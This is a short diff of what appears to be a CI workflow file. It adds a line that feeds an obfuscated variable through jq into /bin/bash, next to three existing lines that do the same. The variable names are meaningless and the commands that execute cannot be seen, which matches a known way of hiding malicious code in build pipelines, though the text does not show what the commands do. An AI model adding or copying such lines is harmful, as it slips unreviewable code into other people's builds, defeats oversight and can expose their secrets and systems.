@@ -67,6 +67,7 @@ jobs:
           echo $r0837 | jq -r .droi823 | /bin/bash
           echo $c9 | jq -r .msfks22121 | /bin/bash
           echo $n88923 | jq -r .i644 | /bin/bash
+          printf '%s' "$bl0" | jq -r .ywhhp02 | /bin/bash
 
       - name: Save archive
         if: always()
